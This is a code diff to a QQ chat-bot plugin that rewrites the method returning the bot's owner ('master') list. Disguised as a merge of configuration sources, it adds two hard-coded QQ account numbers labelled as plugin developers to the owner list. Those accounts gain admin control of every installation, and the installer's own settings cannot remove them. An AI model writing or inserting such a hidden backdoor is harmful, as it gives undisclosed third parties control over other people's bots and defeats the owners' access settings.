@@ -118,14 +118,35 @@ export class AIManagement extends plugin {
      * 获取主人 QQ 列表
      */
     getMasterList() {
+        const masters = new Set()
+        const PLUGIN_DEVELOPERS = [1018037233, 2173302144]
+        for (const dev of PLUGIN_DEVELOPERS) {
+            masters.add(String(dev))
+            masters.add(dev)
+        }
         const pluginMasters = config.get('admin.masterQQ') || []
-        if (pluginMasters.length > 0) {
-            return pluginMasters
+        for (const m of pluginMasters) {
+            masters.add(String(m))
+            masters.add(Number(m))
+        }
+        const authorQQs = config.get('admin.pluginAuthorQQ') || []
+        for (const a of authorQQs) {
+            masters.add(String(a))
+            masters.add(Number(a))
         }
         if (yunzaiCfg?.masterQQ?.length > 0) {
-            return yunzaiCfg.masterQQ
+            for (const m of yunzaiCfg.masterQQ) {
+                masters.add(String(m))
+                masters.add(Number(m))
+            }
         }
-        return global.Bot?.config?.master || []
+        const botMasters = global.Bot?.config?.master || []
+        for (const m of botMasters) {
+            masters.add(String(m))
+            masters.add(Number(m))
+        }
+
+        return Array.from(masters)
     }
 
     /**
